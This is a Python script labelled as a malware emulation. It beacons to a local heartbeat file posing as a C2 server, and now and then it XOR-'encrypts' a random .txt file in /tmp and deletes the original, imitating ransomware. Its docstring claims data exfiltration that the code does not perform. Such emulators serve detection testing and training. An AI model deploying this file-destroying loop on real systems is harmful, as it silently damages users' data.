#!/usr/bin/env python3
"""
Active Malware Payload (Emulation)
- Connects to local 'C2' (Heartbeat file)
- Scans for target files
- Exfiltrates data
"""

import os
import time
import sys
import random
import uuid

# Configuration
C2_HEARTBEAT = "/tmp/c2_heartbeat.log"
EXFIL_DIR = "/tmp/exfil_stash"
TARGET_DIR = "/tmp"

def beacon():
    """Write heartbeat to C2"""
    try:
        with open(C2_HEARTBEAT, "a") as f:
            f.write(f"{time.time()} | BEACON | PID:{os.getpid()}\n")
    except: pass

def encrypt_user_files():
    """Finds a random .txt file and 'encrypts' it"""
    try:
        targets = []
        with os.scandir(TARGET_DIR) as entries:
            for entry in entries:
                if entry.is_file() and entry.name.endswith(".txt") and "malware" not in entry.name:
                    targets.append(entry.path)

        if targets:
            t = random.choice(targets)
            with open(t, "rb") as f: data = f.read()
            encrypted = bytearray([b ^ 0xFF for b in data])
            with open(t + ".enc", "wb") as f: f.write(encrypted)
            os.remove(t)
    except: pass

def main():
    if not os.path.exists(EXFIL_DIR):
        try: os.mkdir(EXFIL_DIR)
        except: pass

    # Main Loop
    while True:
        beacon()

        if random.random() < 0.1:
            encrypt_user_files()

        time.sleep(2)

if __name__ == "__main__":
    # Daemonize (Simulated by just running loop)
    main()
